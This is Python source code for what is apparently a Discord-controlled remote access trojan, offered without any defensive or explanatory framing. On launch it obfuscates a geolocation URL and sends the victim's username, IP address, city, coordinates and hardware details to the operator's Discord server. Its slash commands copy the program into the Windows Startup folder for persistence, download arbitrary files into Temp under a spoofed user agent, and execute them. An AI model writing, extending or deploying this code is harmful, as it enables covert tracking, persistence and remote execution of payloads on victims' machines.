

import discord
from discord.ext import commands
import urllib.request
import json, os, socket, platform, tempfile, random
import uuid  
import shutil, sys

server_id = 123456789
token = "TOKEN HERE"

def globalInfo():
    
    url = 'nosj/oi.ofnipi//:sptth'
    response = urllib.request.urlopen(url[::-1])
    data = json.loads(response.read().decode())
    ip = data['ip']
    loc = data['loc']
    location = loc.split(',')
    latitude = location[0]
    longitude = location[1]
    username = os.getlogin()
    country = data['country']
    country_code = data['country'].lower()
    region = data['region']
    city = data['city']
    postal = data['postal']
    computer_name = socket.gethostname()
    cores = os.cpu_count()
    gpu = ''
    if platform.system() == 'Linux':
        gpu_info = os.popen('lspci | grep -i nvidia').read().strip()
        if gpu_info:
            gpu = os.popen("nvidia-smi --query-gpu=gpu_name --format=csv,noheader").read()

    globalinfo = f":flag_{country_code}: - `{username.upper()} | {ip} ({country}, {city})`\nMore Information 👀 : \n :flag_{country_code}: - `({region}) ({postal})` \n 💻 PC Information : \n`{computer_name}`\n Cores: `{cores}` \nGPU : `{gpu}` \nLatitude + Longitude  : {latitude}, {longitude}\n "
    return globalinfo



intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command('help')

computer_ids = {}

def generate_computer_id():
    return str(uuid.uuid4())


def add_to_startup(program_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    try:
        script_name = os.path.basename(program_path)
        destination_path = os.path.join(startup_folder, script_name)

        if not os.path.exists(destination_path):
            shutil.copyfile(program_path, destination_path)
            print(f'Successfully added {script_name} to startup.')
        else:
            print(f'{script_name} already exists in startup folder.')
    except Exception as e:
        print(f'An error occurred: {str(e)}')


@bot.event
async def on_ready():
    await bot.tree.sync()
    computer_name = socket.gethostname()
    
    computer_id = generate_computer_id()
    computer_ids[computer_id] = bot
    
    
    server = bot.get_guild(server_id)
    channel_name = computer_name
    
    existing_channel = discord.utils.get(server.text_channels, name=channel_name)
    print('done')
    if not existing_channel:
        try:
            data = globalInfo()
        except:
            data = 'Could not get any information about the user'
        new_channel = await server.create_text_channel(channel_name)
        print('created')
    
        embed = discord.Embed(title="Someone launched it =) ")
        embed.add_field(name=f"Computer information\nComputer unique id \n`{computer_id}`\n", value=data)
        
        await new_channel.send(content="@everyone", embed=embed)
        
google_user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'

@bot.tree.command()
async def startup(interaction: discord.Interaction, computer_id: str):
    program_path = sys.argv[0]
    if computer_id in computer_ids:
        bot_instance = computer_ids[computer_id]
        try:
            add_to_startup(program_path)
            await interaction.response.send_message('Added to startup successfully')

        except:
            await interaction.response.send_message('Error while trying to add to startup')

@bot.tree.command()
async def download(interaction: discord.Interaction, computer_id: str, url: str):
    if computer_id in computer_ids:
        bot_instance = computer_ids[computer_id]
        
        headers = {'User-Agent': google_user_agent}
        request = urllib.request.Request(url, headers=headers)

        try:
            with urllib.request.urlopen(request) as response:
                content = response.read()

            file_extension = url.split('.')[-1]

            random_filename = f"{random.randint(1000, 9999)}.{file_extension}"
            print(random_filename)

            temp_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Temp')

            if not os.path.exists(temp_folder):
                os.makedirs(temp_folder)

            full_path = os.path.join(temp_folder, random_filename)

            if os.path.exists(full_path):
                await interaction.response.send_message("A file with the same name already exists in the temp folder.")
            else:
                with open(full_path, 'wb') as file:
                    file.write(content)

                await interaction.response.send_message(f"{random_filename} has been downloaded with Google User-Agent and saved to the temp folder.")

        except urllib.error.URLError as e:
            await interaction.response.send_message(f"Error: {e.reason}")
    
    else:
        await interaction.response.send_message("Invalid computer ID. Please provide a valid computer ID.")

@bot.tree.command()
async def startfile(interaction: discord.Interaction, computer_id: str, file_id: str, file_extension: str):
    if computer_id in computer_ids:
        bot_instance = computer_ids[computer_id]

        temp_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Temp')

        full_path = os.path.join(temp_folder, f"{file_id}.{file_extension}")

        try:
            # Check if the file exists
            if os.path.exists(full_path):
                import subprocess
                subprocess.Popen([full_path], shell=True)

                await interaction.response.send_message(f"Started file {file_id}.{file_extension}")
            else:
                await interaction.response.send_message("File not found in the temp folder.")

        except Exception as e:
            await interaction.response.send_message(f"Error: {str(e)}")
    
    else:
        await interaction.response.send_message("Invalid computer ID. Please provide a valid computer ID.")

    
bot.run(token)
